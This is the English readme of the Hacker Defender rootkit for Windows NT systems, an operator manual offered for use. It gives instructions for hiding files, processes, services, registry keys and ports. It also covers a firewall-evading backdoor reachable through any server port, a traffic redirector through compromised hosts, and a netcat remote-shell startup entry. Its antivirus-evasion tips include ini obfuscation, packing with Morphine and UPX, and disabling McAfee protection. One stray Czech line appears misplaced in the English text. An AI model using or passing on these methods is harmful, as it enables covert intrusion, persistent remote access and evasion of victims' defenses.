======================[ Hacker defender - English readme ]======================

                                  NT Rootkit
                                  ----------

 Authors:        Holy_Father <holy_father@phreaker.net>
                 Ratter/29A <ratter@atlas.cz>
 Version:        1.0.0 revisited
 Birthday:       15.08.2005
 Home:           http://www.hxdef.org, http://hxdef.net.ru, 
                 http://hxdef.czweb.org, http://rootkit.host.sk

 Betatesters:    ch0pper <THEMASKDEMON@flashmail.com>
                 aT4r <at4r@hotmail.com>
                 phj34r <phj34r@gmail.com>
                 unixdied <0edfd3cfd9f513ec030d3c7cbdf54819@hush.ai>
                 rebrinak
                 GuYoMe
                 ierdna <ierdna@go.ro>
                 Afakasf <undefeatable@pobox.sk>

 Readme:         Czech & English by holy_father
                 French by GuYoMe



=====[ 1. Contents ]============================================================

 1. Contents
 2. Introduction
        2.1 Idea
        2.2 Licence
 3. Usage
 4. Inifile
 5. Backdoor
        5.1 Redirector
 6. Technical issues
        6.1 Version
        6.2 Hooked API
        6.3 Known bugs
 7. Faq
 8. Files



=====[ 2. Introduction ]========================================================

        Hacker defender (hxdef) is rootkit for Windows NT 4.0, Windows 2000,
Windows XP and Windows Server 2003, it may also work on latest NT based 
systems. Main code is written in Delphi. New functions are written 
in assembler. Driver code is written in C. Support programs are coded mostly 
in Delphi.

program uses adapted LDE32
LDE32, Length-Disassembler Engine, 32-bit, (x) 1999-2000 Z0MBiE
special edition for REVERT tool
version 1.05

program uses Superfast/Supertiny Compression/Encryption library
Superfast/Supertiny Compression/Encryption library.
(c) 1998 by Jacky Qwerty/29A.


=====[ 2.1 Idea ]===============================================================

        The main idea of this program is to rewrite few memory segments in all
running processes. Rewriting of some basic modules cause changes in processes 
behaviour. Rewriting must not affect the stability of the system or running
processes.
        Program must be absolutely hidden for all others. Now the user is able
to hide files, processes, system services, system drivers, registry keys and 
values, open ports, cheat with free disk space. Program also masks its changes 
in memory and hiddes handles of hidden processes. Program installs hidden 
backdoors, register as hidden system service and installs hidden system driver. 
The technology of backdoor allowed to do the implantation of redirector. 


=====[ 2.2 Licence ]============================================================

        This project is open source since version 1.0.0 but there exist also 
commercial versions with advanced features.

        And of course authors are not responsible for what you're doing with 
Hacker defender.



=====[ 3. Usage ]===============================================================

        Usage of hxdef is quite simple:

        >hxdef100.exe [inifile]
or 
        >hxdef100.exe [switch] 


        Default name for inifile is EXENAME.ini where EXENAME is the name of 
executable of main program without extension. This is used if you run hxdef 
without specifying the inifile or if you run it with switch (so default 
inifile is hxdef100.ini).

        These switches are available:

        -:installonly   -       only install service, but not run
        -:refresh       -       use to update settings from inifile
        -:noservice     -       doesn't install services and run normally
        -:uninstall     -       removes hxdef from the memory and kills all 
                                running backdoor connections
                                stopping hxdef service does the same now

Example:
        >hxdef100.exe -:refresh

        Hxdef with its default inifile is ready to run without any change 
in inifile. But it's highly recommended to create your own settings. See 
4. Inifile section for more information about inifile.
        Switches -:refresh and -:uninstall can be called only from original 
exefile. This mean you have to know the name and path of running hxdef 
exefile to change settings or to uninstall it.



=====[ 4. Inifile ]=============================================================

        Inifile must contain ten parts: [Hidden Table], [Hidden Processes], 
[Root Processes], [Hidden Services], [Hidden RegKeys], [Hidden RegValues], 
[Startup Run], [Free Space], [Hidden Ports] and [Settings]. 
        In [Hidden Table], [Hidden Processes], [Root Processes], 
[Hidden Services] a [Hidden RegValues] can be used character * as the wildcard 
in place of strings end. Asterisk can be used only on strings end, everything 
after first asterisks is ignored. All spaces before first and after last 
another string characters are ignored.

Example:
[Hidden Table]
hxdef*

this will hide all files, dirs and processes which name start with "hxdef".


        Hidden Table is a list of files and directories which should be hidden.
All files and directories in this list will disappear from file managers. Make 
sure main file, inifile, your backdoor file and driver file are mentioned 
in this list.

        Hidden Processes is a list of processes which should be hidden. They 
will be hidden in tasklist etc. Make sure main file and backdoor file is 
in this list.

        Root Processes is a list of programs which will be immune against 
infection. You can see hidden files, directories and programs only with these 
root programs. So, root processes are for rootkit admins. To be mentioned in 
Root Processes doesn't mean you're hidden. It is possible to have root process
which is not hidden and vice versa.

        Hidden Services is a list of service and driver names which will be 
hidden in the database of installed services and drivers. Service name for the 
main rootkit program is HackerDefender100 as default, driver name for the main 
rootkit driver is HackerDefenderDrv100. Both can be changed in the inifile.

        Hidden RegKeys is a list of registry keys which will be hidden. Rootkit
has four keys in registry: HackerDefender100, LEGACY_HACKERDEFENDER100, 
HackerDefenderDrv100, LEGACY_HACKERDEFENDERDRV100 as default. If you rename 
service name or driver name you should also change this list. 
        First two registry keys for service and driver are the same as its 
name. Next two are LEGACY_NAME. For example if you change your service name to 
BoomThisIsMySvc your registry entry will be LEGACY_BOOMTHISISMYSVC.

        Hidden RegValues is a list of registry values which will be hidden.

        Startup Run is a list of programs which rootkit run after its startup.
These programs will have same rights as rootkit. Program name is divided from 
its arguments with question tag. Do not use " characters. Programs will 
terminate after user logon. Use common and well known methods for starting 
programs after user logon. You can use following shortcuts here:
        %cmd%           - stands for system shell exacutable + path
                          (e.g. C:\winnt\system32\cmd.exe)
        %cmddir%        - stands for system shell executable directory
                          (e.g. C:\winnt\system32\)
        %sysdir%        - stands for system directory
                          (e.g. C:\winnt\system32\)
        %windir%        - stands for Windows directory
                          (e.g. C:\winnt\)
        %tmpdir%        - stands for temporary directory
                          (e.g. C:\winnt\temp\)

Example:
1)
[Startup Run]
c:\sys\nc.exe?-L -p 100 -t -e cmd.exe

netcat-shell is run after rootkit startup and listens on port 100

2)
[Startup Run]
%cmd%?/c echo Rootkit started at %TIME%>> %tmpdir%starttime.txt

this will put a time stamp to temporary_directory\starttime.txt 
(e.g. C:\winnt\temp\starttime.txt) everytime rootkit starts
(%TIME% works only with Windows 2000 and higher)


        Free Space is a list of harddrives and a number of bytes you want to 
add to a free space. The list item format is X:NUM where X stands for the 
drive letter and NUM is the number of bytes that will be added to its number of 
free bytes. 

Example:
[Free Space]
C:123456789

this will add about 123 MB more to shown free disk space of disk C


3)
[Hidden Ports]
TCPI:
TCPO:
UDP:53,54,55,56,800

toto skryje pet portu: 53/UDP, 54/UDP, 55/UDP, 56/UDP a 800/UDP
        Hidden Ports is a list of open ports that you want to hide from 
applications like OpPorts, FPort, Active Ports, Tcp View etc. It has three 
lines. First line format is TCPI:port1,port2,port3,..., second line format is
TCPO:port1,port2,port3,..., third line format is UDP:port1,port2,port3,... 

Example:
1)
[Hidden Ports]
TCPI:8080,456
TCPO:
UDP:

this will hide two (inbound) ports: 8080/TCP and 456/TCP

2)
[Hidden Ports]
TCPI:
TCPO:8001
UDP:

this will hide (outbound) port 8001/TCP

3)
[Hidden Ports]
TCPI:
TCPO:
UDP:53,54,55,56,800

this will hide five ports: 53/UDP, 54/UDP, 55/UDP, 56/UDP and 800/UDP


        Settings contains eigth values: Password, BackdoorShell, 
FileMappingName, ServiceName, ServiceDisplayName, ServiceDescription, 
DriverName and DriverFileName.
        Password which is 16 character string used when working with backdoor 
or redirector. Password can be shorter, rest is filled with spaces. 
        BackdoorShell is name for file copy of the system shell which is 
created by backdoor in temporary directory. 
        FileMappingName is the name of shared memory where the settings for 
hooked processes are stored.
        ServiceName is the name of rootkit service. 
        ServiceDisplayName is display name for rootkit service.
        ServiceDescription is description for rootkit service.
        DriverName is the name for hxdef driver.
        DriverFileName is the name for hxdef driver file.

Example:
[Settings]
Password=hxdef-rulez
BackdoorShell=hxdefá$.exe
FileMappingName=_.-=[Hacker Defender]=-._
ServiceName=HackerDefender100
ServiceDisplayName=HXD Service 100
ServiceDescription=powerful NT rootkit
DriverName=HackerDefenderDrv100
DriverFileName=hxdefdrv.sys
        
this mean your backdoor password is "hxdef-rulez", backdoor will copy system 
shell file (usually cmd.exe) to "hxdefá$.exe" to temp. Name of shared memory 
will be "_.-=[Hacker Defender]=-._". Name of a service is "HackerDefender100", 
its display name is "HXD Service 100", its description is "poweful NT rootkit".
Name of a driver is "HackerDefenderDrv100". Driver will be stored in a file 
called "hxdefdrv.sys".


        Extra characters |, <, >, :, \, / and " are ignored on all lines except 
[Startup Run], [Free Space] and [Hidden Ports] items and values in [Settings] 
after first = character. Using extra characters you can make your inifile 
immune from antivirus systems.

Example:
[H<<<idden T>>a/"ble]
>h"xdef"*


is the same as


[Hidden Table]
hxdef*

see hxdef100.ini and hxdef100.2.ini for more examples

        All strings in inifile except those in Settings and Startup Run are 
case insensitive.



=====[ 5. Backdoor ]============================================================

        Rootkit hooks some API functions connected with receiving packets 
from the net. If incoming data equals to 256 bits long key, password 
and service are verified, the copy of a shell is created in a temp, its 
instance is created and next incoming data are redirected to this shell.
        Because rootkit hooks all process in the system all TCP ports on all
servers will be backdoors. For example, if the target has port 80/TCP open for 
HTTP, then this port will also be available as a backdoor. Exception here is 
for ports opened by System process which is not hooked. This backdoor will 
works only on servers where incoming buffer is larger or equal to 256 bits. But 
this feature is on almost all standard servers like Apache, IIS, Oracle.  
Backdoor is hidden because its packets go through common servers on the system. 
So, you are not able to find it with classic portscanner and this backdoor can 
easily go through firewall. Exception in this are classic proxies which are 
protocol oriented for e.g. FTP or HTTP.
        During tests on IIS services was found that HTTP server does not log 
any of this connection, FTP and SMTP servers log only disconnection at the end.
So, if you run hxdef on server with IIS web server, the HTTP port is probably 
the best port for backdoor connection on this machine.
        You have to use special client if want to connect to the backdoor. 
Program bdcli100.exe is used for this.

Usage: bdcli100.exe host port password

Example:
        >bdcli100.exe www.windowsserver.com 80 hxdef-rulez

this will connect to the backdoor if you rooted www.windowsserver.com before 
and left default hxdef password

        Client for version 1.0.0 is not compatible with servers in older 
version.


=====[ 5.1 Redirector ]=========================================================

        Redirector is based on backdoor technology. First connection packets
are same as in backdoor connection. That mean you use same ports as for 
backdoor. Next packets are special packets for redirector only. These packets 
are made by redirectors base which is run on users computer. First packet 
of redirected connection defines target server and port.
        The redirectors base saves its settings into its inifile which name 
depends on base exefile name (so default is rdrbs100.ini). If this file doesn't
exist when base is run, it is created automatically. It is better not to modify
this inifile externaly. All settings can be changed from base console.
        If we want to use redirector on server where rootkit is installed,
we have to run redirectors base on localhost before. Then in base console we 
have to create mapped port routed to server with hxdef. Finally we can connect 
on localhost base on chosen port and transfering data. Redirected data are 
coded with rootkit password. In this version connection speed is limited with 
about 256 kBps. Redirector is not determined to be used for hispeed connections 
in this version. Redirector is also limited with system where rootkit run. 
Redirector works with TCP protocol only.
        In this version the base is controled with 19 commands. These are not
case sensitive. Their function is described in HELP command. During the base
startup are executed commands in startup-list. Startup-list commands are edited
with commands which start with SU.
        Redirector differentiate between two connection types (HTTP and other).
If connection is other type packets are not changed. If it is HTTP type Host
parametr in HTTP header is changed to the target server. Maximum redirectors
count on one base is 1000.
        Redirector base fully works only on NT boxes. Only on NT program has
tray icon and you can hide console with HIDE command. Only on NT base can be
run in silent mode where it has no output, no icon and it does only commands 
in startup-list.


Examples:
1) getting mapped port info

        >MPINFO
        No mapped ports in the list.

2) add command MPINFO to startup-list and get startup-list commands:

        >SUADD MPINFO
        >sulist
        0) MPINFO

3) using of HELP command:

        >HELP
        Type HELP COMMAND for command details.
        Valid commands are:
        HELP, EXIT, CLS, SAVE, LIST, OPEN, CLOSE, HIDE, MPINFO, ADD, DEL, 
        DETAIL, SULIST, SUADD, SUDEL, SILENT, EDIT, SUEDIT, TEST
        >HELP ADD
        Create mapped port. You have to specify domain when using HTTP type.
        usage: ADD <LOCAL PORT> <MAPPING SERVER> <MAPPING SERVER PORT> <TARGET 
        SERVER> <TARGET SERVER PORT> <PASSWORD> [TYPE] [DOMAIN]
        >HELP EXIT
        Kill this application. Use DIS flag to discard unsaved data.
        usage: EXIT [DIS]

4) add mapped port, we want to listen on localhost on port 100, rootkit
is installed on server 200.100.2.36 on port 80, target server is www.google.com 
on port 80, rootkits password is bIgpWd, connection type is HTTP, ip address
of target server (www.google.com) - we always have to know its ip - is 
216.239.53.100:

        >ADD 100 200.100.2.36 80 216.239.53.100 80 bIgpWd HTTP www.google.com

command ADD can be run without parameters, in this case we are asked for every
parameter separately

5) now we can check mapped ports again with MPINFO:
        
        >MPINFO
        There are 1 mapped ports in the list. Currently 0 of them open.

6) enumeration of mapped port list:

        >LIST
        000) :100:200.100.2.36:80:216.239.53.100:80:bIgpWd:HTTP

7) datailed description of one mapped port:
        
        >DETAIL 0
        Listening on port: 100
        Mapping server address: 200.100.2.36
        Mapping server port: 80
        Target server address: 216.239.53.100
        Target server port: 80
        Password: bIgpWd
        Port type: HTTP
        Domain name for HTTP Host: www.google.com
        Current state: CLOSED

8) we can test whether the rootkit is installed with out password on mapping 
server 200.100.2.36 (but this is not needed if we are sure about it):

        >TEST 0
        Testing 0) 200.100.2.36:80:bIgpWd - OK

if test failed it returns
        
        Testing 0) 200.100.2.36:80:bIgpWd - FAILED

9) port is still closed and before we can use it, we have to open it with OPEN
command, we can close port with CLOSE command when it is open, we can use flag
ALL when want to apply these commands on all ports in the list, current state 
after required action is written after a while:
        
        >OPEN 0
        Port number 0 opened.
        >CLOSE 0
        Port number 0 closed.

or

        >OPEN ALL
        Port number 0 opened.
        
10) to save current settings and lists we can use SAVE command, this saves
all to inifile (saving is also done by command EXIT without DIS flag):
        
        >SAVE
        Saved successfully.


Open port is all what we need for data transfer. Now you can open your 
favourite explorer and type http://localhost:100/ as url. If no problems you
will see how main page on www.google.com is loaded.
        First packets of connection can be delayed up to 5 seconds, but others
are limited only by speed of server, your internet connection speed and by
redirector technology which is about 256 kBps in this version.



=====[ 6. Technical issues ]====================================================

        This section contains no interesting information for common users. This 
section should be read by all betatesters and developpers.


=====[ 6.1 Version ]============================================================

1.0.0 revisited
        +       compiler define for disabling NtOpenFile hook
        +       outbound TCP connection hiding
        +       separation between hidden files and processes - Hidden Processes
        +       hidden files in Prefetch are deleted during initialization
        +       disabling incompatible McAfee Buffer Overflow protection 
        x       found and fixed several bugs, source code cleanup        

1.0.0   +       open source

0.8.4   +       French readme
        +       hook of NtCreateFile to hide file operations
        +       hxdef mailslot name is dynamic
        +       switch -:uninstall for removing and updating hxdef
        +       -:refresh can be run from original .exe file only
        +       new readme - several corrections, more information, faq
        +       shortcuts for [Startup Run]
        +       free space cheating via NtQueryVolumeInformationFile hook
        +       open ports hiding via NtDeviceIoControlFile hook
        +       much more info in [Comments] in inifile
        +       supporting Ctrl+C in backdoor session
        +       FileMappingName is an option now
        +       Root Processes running on the system level
        +       handles hiding via NtQuerySystemInformation hook class 16
        +       using system driver
        +       antiantivirus inifile
        +       more stable on Windows boot and shutdown
        +       memory hiding improved
        -       found bug in backdoor client when pasting data from clipboard
        x       found and fixed bug in service name
        x       found and fixed increasing pid bug fixed via NtOpenProcess hook
        x       found and fixed bug in NtReadVirtualMemory hook
        x       found and fixed several small bugs
        x       found and fixed backdoor shell name bug fix

0.7.3   +       direct hooking method
        +       hiding files via NtQueryDirectoryFile hook
        +       hiding files in ntvdm via NtVdmControl hook
        +       new process hooking via NtResumeThread hook
        +       process infection via LdrInitializeThunk hook
        +       reg keys hiding via NtEnumerateKey hook
        +       reg values hiding via NtEnumerateValueKey hook
        +       dll infection via LdrLoadDll hook
        +       more settings in inifile
        +       safemode support
        +       masking memory change in processes via NtReadVirtualMemory hook
        x       fixed debugger bug
        x       fixed w2k MSTS bug
        x       found and fixed zzZ-service bug

0.5.1   +       never more hooking WSOCK 
        x       fixed bug with MSTS

0.5.0   +       low level redir based on backdoor technique
        +       password protection
        +       name of inifile depends on exefile name
        +       backdoor stability improved
        -       redirectors conection speed is limited about 256 kBps,
                imperfect implementation of redirector,
                imperfect design of redirector
        -       found chance to detect rootkit with symbolic link objects
        -       found bug in connection with MS Termnial Services
        -       found bug in hidding files in 16-bit applications
        x       found and fixed bug in services enumeration
        x       found and fixed bug in hooking servers

0.3.7   +       possibility to change settings during running
        +       wildcard in names of hidden files, process and services
        +       possibility to add programs to rootkit startup
        x       fixed bug in hidding services on Windows NT 4.0

0.3.3   +       stability realy improved
        x       fixed all bugs for Windows XP
        x       found and fixed bug in hiding in registry
        x       found and fixed bug in backdoor with more clients

0.3.0   +       connectivity, stability and functionality of backdoor improved 
        +       backdoor shell runs always on system level 
        +       backdoor shell is hidden 
        +       registry keys hiding
        x       found and fixed bug in root processes
        -       bug in XP after reboot

0.2.6   x       fixed bug in backdoor

0.2.5   +       fully interactive console
        +       backdoor identification key is now only 256 bits long
        +       improved backdoor installation
        -       bug in backdoor

0.2.1   +       always run as service

0.2.0   +       system service installation 
        +       hiding in database of installed services 
        +       hidden backdoor
        +       no more working with windows

0.1.1   +       hidden in tasklist
        +       usage - possibility to specify name of inifile
        x       found and then fixed bug in communication
        x       fixed bug in using advapi
        -       found bug with debuggers

0.1.0   +       infection of system services
        +       smaller, tidier, faster code, more stable program
        x       fixed bug in communication

0.0.8   +       hiding files
        +       infection of new processes
        -       can't infect system services
        -       bug in communication


=====[ 6.2 Hooked API ]=========================================================

List of API functions which are hooked:

Kernel32.ReadFile
Ntdll.NtQuerySystemInformation (class 5 a 16)
Ntdll.NtQueryDirectoryFile
Ntdll.NtVdmControl
Ntdll.NtResumeThread
Ntdll.NtEnumerateKey
Ntdll.NtEnumerateValueKey
Ntdll.NtReadVirtualMemory
Ntdll.NtQueryVolumeInformationFile
Ntdll.NtDeviceIoControlFile
Ntdll.NtLdrLoadDll
Ntdll.NtOpenProcess
Ntdll.NtCreateFile
Ntdll.NtOpenFile
Ntdll.NtLdrInitializeThunk
WS2_32.recv
WS2_32.WSARecv
Advapi32.EnumServiceGroupW
Advapi32.EnumServicesStatusExW
Advapi32.EnumServicesStatusExA
Advapi32.EnumServicesStatusA


=====[ 6.3 Known bugs ]=========================================================

        There is one known bug in this version. 

1)
        Backdoor client may crash when you paste more data from clipboard using 
rigth click to the console or using console menu. You can still paste the data 
from clipboard using Ctrl+Ins, Shift+Ins if the program running in the console 
supports this.


        If you think you find the bug please report it to the public board 
(or to betatesters board if you are betatester) or on <rootkit@host.sk>. 
But be sure you've read this readme, faq section, todo list and the board and 
you find nothing about what you want to write about before you write it. 



=====[ 7. Faq ]=================================================================

        Because of many simple questions on the board I realize to create a faq
section in this readme. Before you ask about anything read this readme twice 
and take special care to this section. Then read old messages on the board 
and after then if you still think you are not able to find an answer for your 
question you can put it on the board.

        The questions are:

1) I've download hxdef, run it and can't get a rid of it. How can I uninstall 
it if I can't see its process, service and files?
2) Somebody hacked my box, run hxdef and I can't get a rid of it. How can I 
uninstall it and all that backdoors that were installed on my machine?
3) Is this program detected by antivirus software? And if yes, is there any way 
to beat it?
4) How is that I can't connect to backdoor on ports 135/TCP, 137/TCP, 138/TCP, 
139/TCP or 445/TCP when target box has them open?
5) Is there any way to have hidden process which file on disk is visible?
6) How about hiding svchost.exe and others I can see in tasklist?
7) I'm using DameWare and I can see all your services and all that should be 
hidden. Is this the bug? 
8) But anyone can see my hidden files via netbios. What should I do?
9) Backdoor client is not working. Everything seems ok, but after connecting 
I can't type anything and the whole console screen is black. What should I do?
10) When will we get the new version?
11) net.exe command can stop hidden services, is this the bug?
12) Is there any way to detect this rootkit?
13) So, how is it difficult to detect hxdef. And did somebody make a proggie 
that can do it?
14) So, how can I detect it?
15) Does the version number which starts with 0 mean that it is not stable 
version?
16) When will you publish the source? I've read it will be with the version 
1.0.0, but when?
17) I want to be the betatester, what should I do?
18) Is it legal to use hxdef?
19) Is it possible to update machine with old hxdef with this version? Is it 
possible without rebooting the machine?
20) Is it possible to update machine with this version of hxdef with a newer 
version I get in future? Is it possible without rebooting?
21) Is it better to use -:uninstall or to use net stop ServiceName?
22) I really love this proggie. Can I support your work with a little donation?
23) Is there any chance to hide C:\temp and not to hide C:\winnt\temp?
24) I can see the password in inifile is plaintext! How is this possible?
25) If I have a process that is in Hidden Processes and it listens on a port, 
will this port be automatically hidden or should I put it to Hidden Ports?



        Now get the answers:



1)
Q: I've download hxdef, run it and can't get a rid of it. How can I uninstall 
it if I can't see its process, service and files?

A: If you left default settings you can run shell and stop the service:

        >net stop HackerDefender100

Hxdef is implemented to uninstall completely is you stop its service. This does 
the same as -:uninstall but you don't need to know where hxdef is.

If you changed ServiceName in inifile Settings, type this in your shell:

        >net stop ServiceName

where ServiceName stands for the value you set to ServiceName in inifile.

If you forgot the name of the service you can boot your system from CD 
and try to find hxdef inifile and look there for ServiceName value and then 
stop it as above.


2) 
Q: Somebody hacked my box, run hxdef and I can't get a rid of it. How can I 
uninstall it and all that backdoors that were installed on my machine?

A: Only 100% solution is to reinstall your Windows. But if you want to do this 
you'll have to find the inifile like in question 1) above. Then after 
uninstalling hxdef from your system go through inifile and try to find all 
files that match files in its lists, verify these files and delete them 
if they belongs to the attacker.


3)
Q: Is this program detected by antivirus software? And if yes, is there any way 
to beat it?

A: Yes, and not only the exefile is detected, few antivirus systems also 
detect inifile and also driver file may be detected. The answer for second 
question here is yes, you can beat it quite easily. On hxdef home site you can 
find a tool called Morphine. If you use Morphine on hxdef exefile you will get 
a new exefile which can't be detected with common antivirus systems. Inifile 
is also designed to beat antivirus systems. You can add extra characters to it 
to confuse antivirus systems. See 4. Inifile section for more info. Also see 
included inifiles. There are two samples that are equal, but the first one is 
using extra characters so it can't be detected by common antivirus systems.
Probably the best way is to use UPX before you use Morphine. UPX will reduce 
the size of hxdef exefile and Morphine will make the antiantivirus shield. 
See Morphine readme for more info about it.


4)
Q: How is that I can't connect to backdoor on ports 135/TCP, 137/TCP, 138/TCP, 
139/TCP or 445/TCP when target box has them open?

A: As mentioned in 5. Backdoor section of this readme backdoor need server 
with incomming buffer larger or equal to 256 bits. And also system ports may 
not work. If you have a problem with find open port that works you can simply 
run netcat and listen on your own port. You should add this netcat port to 
Hidden Ports in inifile then.


5)
Q: Is there any way to have hidden process which file on disk is visible?

A: No. And you also can't have a hidden file on disk of process which is 
visible in the task list.


6)
Q: How about hiding svchost.exe and others I can see in tasklist?

A: This is really bad idea. If you hide common system processes your Windows 
can crash very soon. With hxdef you don't need to name your malicious files 
like svchost.exe, lsass.exe etc. you can name it with any name and add this 
name to Hidden Processes to hide them.


7)
Q: I'm using DameWare and i can see all your services and all that should be 
hidden. Is this the bug? 

A: Nope. DameWare and others who use remote sessions (and or netbios) can see 
hidden services because this feature is not implemented yet. It's a big 
difference between the bug and not implemented. See todo list on the web for 
things that are not implemented yet.


8) 
Q: But anyone can see my hidden files via netbios. What should I do?

A: Put your files deeply into the system directories or to directories that are 
not shared.


9) 
Q: Backdoor client is not working. Everything seems ok, but after connecting 
I can't type anything and the whole console screen is black. What should I do?

A: You probably use bad port for connecting. Hxdef tries to detect bad ports 
and disconnect you, but sometimes it is not able to detect you are using bad 
port. So, try to use different port.


10)
Q: When will we get the new version?

A: Developers code this stuff in their free time. They take no money for this 
and they don't want to get the money for this. There are only two coders right 
now and we think this is enough for this project. This mean coding is not as 
fast as microsoft and you should wait and don't ask when the new version will 
be released. Unlike microsoft our product is free and we have good betatesters 
and we test this proggie a lot, so our public version are stable. 


11)
Q: net.exe command can stop hidden services, is this the bug?

A: Nope. It is not a bug, it is the feature. You still have to know the name 
of the service you want to stop and if it is hidden the only who can know it 
is the rootkit admin. Don't be scared this is the way how to detect you.


12) 
Q: Is there any way to detect this rootkit?

A: Yes. There are so many ways how to detect any rootkit and this one is not 
(and can't be) exception. Every rootkit can be detected. Only questions here 
are how is it difficult and did somebody make a proggie that can do it?


13)
Q: So, how is it difficult to detect hxdef. And did somebody make a proggie 
that can do it?

A: It is very very easy to detect this, but I don't know special tool that can 
tell you that there is hxdef on your machine rigth now.


14) 
Q: So, how can I detect it?

A: I won't tell you this :)


15) 
Q: Does the version number which starts with 0 mean that it is not stable 
version?

A: No, it means that there are few things that are not implemented yet and that 
the source is closed and under development.


16)
Q: When will you publish the source? I've read it will be with the version 
1.0.0, but when?

A: I really don't know when. There are several things I want to implement 
before releasing 1.0.0. It can take a six months as well as a year or longer.


17)
Q: I want to be the betatester, what should I do?

A: You should write me the mail about how can you contribute and what are your 
abilities for this job and your experiences with betatesting. But the chance to 
be a new betatester for this project is quite low. Right now we have enough 
testers who do a good job. No need to increase the number of them.


18)
Q: Is it legal to use hxdef?

A: Sure it is, but hxdef can be easily misused for illegal activities.


19) 
Q: Is it possible to update machine with old hxdef with this version? Is it 
possible without rebooting the machine?

A: It isn't possible without rebooting the machine, but you can update it when 
you do a manual uninstall of that old version, reboot the machine and install 
the new version.


20)
Q: Is it possible to update machine with this version of hxdef with a newer 
version I get in future? Is it possible without rebooting?

A: Yes! You can use -:uninstall to totaly remove this version of hxdef without 
rebooting. Then simply install the new version.


21)
Q: Is it better to use -:uninstall or to use net stop ServiceName?

A: The prefered way is to use -:uninstall if you have the chance. But net stop 
will also does the stuff.


22) 
Q: I really love this proggie. Can I support your work with a little donation?

A: We don't need it, but we will be you give your money to any of those 
beneficent organisations in your country and write us the mail about it. 


23)
Q: Is there any chance to hide C:\temp and not to hide C:\winnt\temp?

A: No. Create your own directory with a specific name and put it to the Hidden 
Table.


24)
Q: I can see the password in inifile is plaintext! How is this possible?

A: You migth think this is quite unsecure way to store password but if you hide 
your inifile nobody can read it. So, it is secure. And it is easy to change 
anytime and you can use -:refresh to change the password easily. 


25) 
Q: If I have a process that is in Hidden Processes and it listens on a port, 
will this port be automatically hidden or should I put it to Hidden Ports?

A: Only hidden ports are those in Hidden Ports list. So, yes, you should put it 
in to Hidden Ports.



=====[ 8. Files ]===============================================================

        An original archive of Hacker defender v1.0.0 contains these files:

hxdef100.exe    70 656 b        - program Hacker defender v1.0.0
hxdOFdis.exe    70 656 b        - program Hacker defender v1.0.0 compiled with 
                                  NtOpenFile hook disabled
hxdef100.ini     4 119 b        - inifile with default settings
hxdef100.2.ini   3 924 b        - inifile with default settings, variant 2
bdcli100.exe    26 624 b        - backdoor client
rdrbs100.exe    49 152 b        - redirectors base
readmecz.txt    37 407 b        - Czech version of readme file
readmeen.txt    37 905 b        - this readme file
src.zip         93 679 b        - source 

===================================[ End ]======================================
